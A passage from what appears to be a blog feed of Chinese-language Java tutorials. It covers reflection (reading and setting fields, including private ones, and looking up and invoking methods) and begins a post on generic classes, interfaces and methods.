class="hljs-string">&quot;Lily&quot;</span>);<br><br><span class="hljs-comment">//只获取当前类的字段,不获取父类的字段</span><br>Field descField = clazz.getDeclaredField(<span class="hljs-string">&quot;desc&quot;</span>);<br>descField.set(st,<span class="hljs-string">&quot;I am student&quot;</span>);<br>Field scoreField = clazz.getDeclaredField(<span class="hljs-string">&quot;score&quot;</span>);<br><span class="hljs-comment">//设置可访问，score是private的</span><br>scoreField.setAccessible(<span class="hljs-keyword">true</span>);<br>scoreField.set(st,<span class="hljs-number">88</span>);<br>System.out.println(st.toString());<br><br><span class="hljs-comment">//输出结果：Student&#123;age=18, name=&#x27;Lily ,desc=&#x27;I am student&#x27;, score=88&#125; </span><br><br><span class="hljs-comment">//获取字段值</span><br>System.out.println(scoreField.get(st));<br><span class="hljs-comment">// 88</span><br><br></code></pre></div></td></tr></table></figure><p>其中的set(Object obj, Object value)方法是Field类本身的方法，用于设置字段的值，而get(Object obj)则是获取字段的值。</p><p>Field类还有其他常用的方法：</p><table><thead><tr><th align="center">方法返回值</th><th align="center">方法名称</th><th align="center">方法说明</th></tr></thead><tbody><tr><td align="center">void</td><td align="center">set(Object obj, Object value)</td><td align="center">将指定对象变量上此 Field 对象表示的字段设置为指定的新值。</td></tr><tr><td align="center">Object</td><td align="center">get(Object obj)</td><td align="center">返回指定对象上此 Field 表示的字段的值</td></tr><tr><td align="center">Class&lt;?&gt;</td><td align="center">getType()</td><td align="center">返回一个 Class 对象，它标识了此Field 对象所表示字段的声明类型。</td></tr><tr><td align="center">boolean</td><td align="center">isEnumConstant()</td><td align="center">如果此字段表示枚举类型的元素则返回 true；否则返回 false</td></tr><tr><td align="center">String</td><td align="center">toGenericString()</td><td align="center">返回一个描述此 Field（包括其一般类型）的字符串</td></tr><tr><td align="center">String</td><td align="center">getName()</td><td align="center">返回此 Field 对象表示的字段的名称</td></tr><tr><td align="center">Class&lt;?&gt;</td><td align="center">getDeclaringClass()</td><td align="center">返回表示类或接口的 Class 对象，该类或接口声明由此 Field 对象表示的字段</td></tr><tr><td align="center">void</td><td align="center">setAccessible(boolean flag)</td><td align="center">将此对象的 accessible 标志设置为指示的布尔值,即设置其可访问性</td></tr></tbody></table><p>上述方法可能是较为常用的，事实上在设置值的方法上，Field类还提供了专门针对基本数据类型的方法，如<code>setInt()/getInt()</code>、<code>setBoolean()/getBoolean</code>、<code>setChar()/getChar()</code>等等方法。需要特别注意的是被final关键字修饰的Field字段是安全的，在运行时可以接收任何修改，但最终其实际值是不会发生改变的。</p><h3 id="2-4-获取方法"><a href="#2-4-获取方法" class="headerlink" title="2.4 获取方法"></a>2.4 获取方法</h3><p>Method 提供关于类或接口上单独某个方法（以及如何访问该方法）的信息，所反映的方法可能是类方法或实例方法（包括抽象方法）。<br>Class类获取Method对象相关的方法：</p><table><thead><tr><th align="center">方法返回值</th><th align="center">方法名称</th><th align="center">方法说明</th></tr></thead><tbody><tr><td align="center">Method</td><td align="center">getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes)</td><td align="center">返回一个指定参数的Method对象，该对象反映此 Class 对象所表示的类或接口的指定已声明方法。</td></tr><tr><td align="center">Method[]</td><td align="center">getDeclaredMethod()</td><td align="center">返回 Method 对象的一个数组，这些对象反映此 Class 对象表示的类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。</td></tr><tr><td align="center">Method</td><td align="center">getMethod(String name, Class&lt;?&gt;… parameterTypes)</td><td align="center">返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定公共成员方法。</td></tr><tr><td align="center">Method[]</td><td align="center">getMethods()</td><td align="center">返回一个包含某些 Method 对象的数组，这些对象反映此 Class 对象所表示的类或接口（包括那些由该类或接口声明的以及从超类和超接口继承的那些的类或接口）的公共 member 方法。</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectMethod</span>  </span>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;reflect.Circle&quot;</span>);<br><br>        <span class="hljs-comment">//根据参数获取public的Method,包含继承自父类的方法</span><br>        Method method = clazz.getMethod(<span class="hljs-string">&quot;draw&quot;</span>,<span class="hljs-keyword">int</span>.class,String.class);<br><br>        System.out.println(<span class="hljs-string">&quot;method:&quot;</span>+method);<br><br>        <span class="hljs-comment">//获取所有public的方法:</span><br>        Method[] methods =clazz.getMethods();<br>        <span class="hljs-keyword">for</span> (Method m:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;m::&quot;</span>+m);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;=========================================&quot;</span>);<br><br>        <span class="hljs-comment">//获取当前类的方法包含private,该方法无法获取继承自父类的method</span><br>        Method method1 = clazz.getDeclaredMethod(<span class="hljs-string">&quot;drawCircle&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;method1::&quot;</span>+method1);<br>        <span class="hljs-comment">//获取当前类的所有方法包含private,该方法无法获取继承自父类的method</span><br>        Method[] methods1=clazz.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (Method m:methods1)&#123;<br>            System.out.println(<span class="hljs-string">&quot;m1::&quot;</span>+m);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shape</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;draw&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">(<span class="hljs-keyword">int</span> count , String name)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;draw &quot;</span>+ name +<span class="hljs-string">&quot;,count=&quot;</span>+count);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Shape</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drawCircle</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;drawCircle&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAllCount</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-comment">//输出结果</span><br>method:<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> reflect.Shape.draw(<span class="hljs-keyword">int</span>,java.lang.String)<br><br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> reflect.Circle.getAllCount()<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> reflect.Shape.draw()<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> reflect.Shape.draw(<span class="hljs-keyword">int</span>,java.lang.String)<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> java.lang.Object.wait(<span class="hljs-keyword">long</span>,<span class="hljs-keyword">int</span>) <span class="hljs-keyword">throws</span> java.lang.InterruptedException<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> java.lang.Object.wait(<span class="hljs-keyword">long</span>) <span class="hljs-keyword">throws</span> java.lang.InterruptedException<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> java.lang.Object.wait() <span class="hljs-keyword">throws</span> java.lang.InterruptedException<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> java.lang.Object.equals(java.lang.Object)<br>m::<span class="hljs-keyword">public</span> java.lang.String java.lang.Object.toString()<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">int</span> java.lang.Object.hashCode()<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> java.lang.Class java.lang.Object.getClass()<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> java.lang.Object.notify()<br>m::<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> java.lang.Object.notifyAll()<br><br>=========================================<br>method1::<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> reflect.Circle.drawCircle()<br><br>m1::<span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> reflect.Circle.getAllCount()<br>m1::<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> reflect.Circle.drawCircle()<br><br></code></pre></div></td></tr></table></figure><p>在通过getMethods方法获取Method对象时，会把父类的方法也获取到，如上的输出结果，把Object类的方法都打印出来了。而getDeclaredMethod/getDeclaredMethods方法都只能获取当前类的方法。我们在使用时根据情况选择即可。<br>通过Method对象调用指定类的方法：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class clazz = Class.forName(<span class="hljs-string">&quot;reflect.Circle&quot;</span>);<br><span class="hljs-comment">//创建对象</span><br>Circle circle = (Circle) clazz.newInstance();<br><br><span class="hljs-comment">//获取指定参数的方法对象Method</span><br>Method method = clazz.getMethod(<span class="hljs-string">&quot;draw&quot;</span>,<span class="hljs-keyword">int</span>.class,String.class);<br><br><span class="hljs-comment">//通过Method对象的invoke(Object obj,Object... args)方法调用</span><br>method.invoke(circle,<span class="hljs-number">15</span>,<span class="hljs-string">&quot;圈圈&quot;</span>);<br><br><span class="hljs-comment">//对私有无参方法的操作</span><br>Method method1 = clazz.getDeclaredMethod(<span class="hljs-string">&quot;drawCircle&quot;</span>);<br><span class="hljs-comment">//修改私有方法的访问标识</span><br>method1.setAccessible(<span class="hljs-keyword">true</span>);<br>method1.invoke(circle);<br><br><span class="hljs-comment">//对有返回值得方法操作</span><br>Method method2 =clazz.getDeclaredMethod(<span class="hljs-string">&quot;getAllCount&quot;</span>);<br>Integer count = (Integer) method2.invoke(circle);<br>System.out.println(<span class="hljs-string">&quot;count:&quot;</span>+count);<br><br><br><span class="hljs-comment">//输出结果</span><br>draw 圈圈,count=<span class="hljs-number">15</span><br>drawCircle<br>count:<span class="hljs-number">100</span><br></code></pre></div></td></tr></table></figure><p>在上述代码中调用方法，使用了Method类的invoke(Object obj,Object… args)第一个参数代表调用的对象，第二个参数传递的调用方法的参数。这样就完成了类方法的动态调用。</p><table><thead><tr><th align="center">方法返回值</th><th align="center">方法名称</th><th align="center">方法说明</th></tr></thead><tbody><tr><td align="center">Object</td><td align="center">invoke(Object obj, Object… args)</td><td align="center">对带有指定参数的指定对象调用由此 Method 对象表示的底层方法。</td></tr><tr><td align="center">Class&lt;?&gt;</td><td align="center">getReturnType()</td><td align="center">返回一个 Class 对象，该对象描述了此 Method 对象所表示的方法的正式返回类型,即方法的返回类型</td></tr><tr><td align="center">Type</td><td align="center">getGenericReturnType()</td><td align="center">返回表示由此 Method 对象所表示方法的正式返回类型的 Type 对象，也是方法的返回类型。</td></tr><tr><td align="center">Class&lt;?&gt;[]</td><td align="center">getParameterTypes()</td><td align="center">按照声明顺序返回 Class 对象的数组，这些对象描述了此 Method 对象所表示的方法的形参类型。即返回方法的参数类型组成的数组</td></tr><tr><td align="center">Type[]</td><td align="center">getGenericParameterTypes()</td><td align="center">按照声明顺序返回 Type 对象的数组，这些对象描述了此 Method 对象所表示的方法的形参类型的，也是返回方法的参数类型</td></tr><tr><td align="center">String</td><td align="center">getName()</td><td align="center">以 String 形式返回此 Method 对象表示的方法名称，即返回方法的名称</td></tr><tr><td align="center">boolean</td><td align="center">isVarArgs()</td><td align="center">判断方法是否带可变参数，如果将此方法声明为带有可变数量的参数，则返回 true；否则，返回 false。</td></tr><tr><td align="center">String</td><td align="center">toGenericString()</td><td align="center">返回描述此 Method 的字符串，包括类型参数。</td></tr></tbody></table><p><code>getReturnType方法/getGenericReturnType方法</code>都是获取Method对象表示的方法的返回类型，只不过前者返回的Class类型后者返回的Type(前面已分析过)，Type就是一个接口而已，在Java8中新增一个默认的方法实现，返回的就参数类型信息。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Type</span> </span>&#123;<br>    <span class="hljs-comment">//1.8新增</span><br>    <span class="hljs-function"><span class="hljs-keyword">default</span> String <span class="hljs-title">getTypeName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> toString();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>而<code>getParameterTypes/getGenericParameterTypes</code>也是同样的道理，都是获取Method对象所表示的方法的参数类型，其他方法与前面的Field和Constructor是类似的。</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础学习-泛型</title>
    <link href="/2021/08/04/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E6%B3%9B%E5%9E%8B/"/>
    <url>/2021/08/04/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E6%B3%9B%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>Java泛型这个特性是从JDK 1.5才开始加入的，因此为了兼容之前的版本，Java泛型的实现采取了“伪泛型”的策略，即Java在语法上支持泛型，但是在编译阶段会进行所谓的“类型擦除”（Type Erasure），将所有的泛型表示（尖括号中的内容）都替换为具体的类型（其对应的原生态类型），就像完全没有泛型一样。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-泛型的基本使用"><a href="#1-泛型的基本使用" class="headerlink" title="1.泛型的基本使用"></a>1.泛型的基本使用</h2><p>泛型的本质是为了参数化类型（在不创建新的类型的情况下，通过泛型指定的不同类型来控制形参具体限制的类型）。也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。引入泛型的意义在于：适用于多种数据类型执行相同的代码（代码复用）。泛型有三种使用方式，分别为：泛型类、泛型接口、泛型方法。</p><h2 id="2-泛型类"><a href="#2-泛型类" class="headerlink" title="2.泛型类"></a>2.泛型类</h2><h3 id="2-1-简单泛型类"><a href="#2-1-简单泛型类" class="headerlink" title="2.1 简单泛型类"></a>2.1 简单泛型类</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span>&lt;<span class="hljs-title">T</span>&gt;</span>&#123;         <span class="hljs-comment">// 此处可以随便写标识符号，T是type的简称  </span><br>    <span class="hljs-keyword">private</span> T <span class="hljs-keyword">var</span> ;     <span class="hljs-comment">// var的类型由T指定，即：由外部指定  </span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">getVar</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">// 返回值的类型由外部决定  </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">var</span> ;  <br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setVar</span><span class="hljs-params">(T <span class="hljs-keyword">var</span>)</span></span>&#123;  <span class="hljs-comment">// 设置的类型也由外部决定  </span><br>        <span class="hljs-keyword">this</span>.<span class="hljs-keyword">var</span> = <span class="hljs-keyword">var</span> ;  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericsDemo06</span></span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span></span>&#123;  <br>        Point&lt;String&gt; p = <span class="hljs-keyword">new</span> Point&lt;String&gt;() ;     <span class="hljs-comment">// 里面的var类型为String类型</span><br>        <span class="hljs-comment">//类型必须为引用类型；不能为基本类型，如：int、double等。但Integer、Double可以。  </span><br>        p.setVar(<span class="hljs-string">&quot;it&quot;</span>) ;                            <span class="hljs-comment">// 设置字符串  </span><br>        System.out.println(p.getVar().length()) ;   <span class="hljs-comment">// 取得字符串的长度  </span><br>    &#125;  <br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="2-2-多元泛型"><a href="#2-2-多元泛型" class="headerlink" title="2.2 多元泛型"></a>2.2 多元泛型</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notepad</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;</span>&#123;       <span class="hljs-comment">// 此处指定了两个泛型类型  </span><br>    <span class="hljs-keyword">private</span> K key ;     <span class="hljs-comment">// 此变量的类型由外部决定  </span><br>    <span class="hljs-keyword">private</span> V value ;   <span class="hljs-comment">// 此变量的类型由外部决定  </span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> K <span class="hljs-title">getKey</span><span class="hljs-params">()</span></span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.key ;  <br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">getValue</span><span class="hljs-params">()</span></span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.value ;  <br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setKey</span><span class="hljs-params">(K key)</span></span>&#123;  <br>        <span class="hljs-keyword">this</span>.key = key ;  <br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setValue</span><span class="hljs-params">(V value)</span></span>&#123;  <br>        <span class="hljs-keyword">this</span>.value = value ;  <br>    &#125;  <br>&#125; <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericsDemo09</span></span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span></span>&#123;  <br>        Notepad&lt;String,Integer&gt; t = <span class="hljs-keyword">null</span> ;        <span class="hljs-comment">// 定义两个泛型类型的对象  </span><br>        t = <span class="hljs-keyword">new</span> Notepad&lt;String,Integer&gt;() ;       <span class="hljs-comment">// 里面的key为String，value为Integer  </span><br>        t.setKey(<span class="hljs-string">&quot;汤姆&quot;</span>) ;        <span class="hljs-comment">// 设置第一个内容  </span><br>        t.setValue(<span class="hljs-number">20</span>) ;            <span class="hljs-comment">// 设置第二个内容  </span><br>        System.out.print(<span class="hljs-string">&quot;姓名；&quot;</span> + t.getKey()) ;      <span class="hljs-comment">// 取得信息  </span><br>        System.out.print(<span class="hljs-string">&quot;，年龄；&quot;</span> + t.getValue()) ;       <span class="hljs-comment">// 取得信息  </span><br>  <br>    &#125;  <br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="3-泛型接口"><a href="#3-泛型接口" class="headerlink" title="3.泛型接口"></a>3.泛型接口</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.generics;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/4 15:24</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">info</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123; <span class="hljs-comment">// 在接口上定义泛型</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">getvar</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 定义抽象方法，抽象方法的返回值就是泛型类型</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myinfo</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">info</span>&lt;<span class="hljs-title">T</span>&gt;</span>&#123; <span class="hljs-comment">// 定义泛型接口的子类</span><br>    <span class="hljs-keyword">private</span> T <span class="hljs-keyword">var</span> ; <span class="hljs-comment">// 定义属性</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">getvar</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-keyword">var</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">myinfo</span><span class="hljs-params">(T <span class="hljs-keyword">var</span>)</span></span>&#123; <span class="hljs-comment">// 通过构造方法设置属性内容</span><br>        <span class="hljs-keyword">this</span>.setvar(<span class="hljs-keyword">var</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setvar</span><span class="hljs-params">(T <span class="hljs-keyword">var</span>)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.<span class="hljs-keyword">var</span> = <span class="hljs-keyword">var</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestGenInterface</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        info&lt;String&gt; st = <span class="hljs-keyword">new</span> myinfo&lt;String&gt;(<span class="hljs-string">&quot;dragon&quot;</span>);<span class="hljs-comment">// 声明接口对象 ,通过子类实例化对象  </span><br>        System.out.println(st.getvar());<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">// dragon</span><br></code></pre></div></td></tr></table></figure><h2 id="4-泛型方法"><a href="#4-泛型方法" class="headerlink" title="4.泛型方法"></a>4.泛型方法</h2><p>泛型方法，是在调用方法的时候指明泛型的具体类型。<br>之所以使用泛型方法。是因为泛型类要在实例化的时候就指明类型，如果想换一种类型，不得不重新new一次，可能不够灵活；而泛型方法可以在调用的时候指明类型，更加灵活。泛型类，是在实例化类的时候指明泛型的具体类型；泛型方法，是在调用方法的时候指明泛型的具体类型 。</p><ul><li>定义泛型方法语句格式：</li></ul><p><img src="https://img-blog.csdnimg.cn/d25b2bc8a7e0429797f0c6cb3377615e.png"></p><ul><li>调用泛型方法语法格式：</li></ul><p><img src="https://img-blog.csdnimg.cn/598c57b97d9a4f2b93cf9ec523b304b0.png"></p><blockquote><p>说明</p></blockquote><ul><li>1）public 与 返回值中间&lt;T&gt;非常重要，可以理解为声明此方法为泛型方法。</li><li>2）只有声明了&lt;T&gt;的方法才是泛型方法，泛型类中的使用了泛型的成员方法并不是泛型方法。</li><li>3）&lt;T&gt;表明该方法将使用泛型类型T，此时才可以在方法中使用泛型类型T。</li><li>4）与泛型类的定义一样，此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型。</li></ul><p>定义泛型方法时，必须在返回值前边加一个 &lt;T&gt; 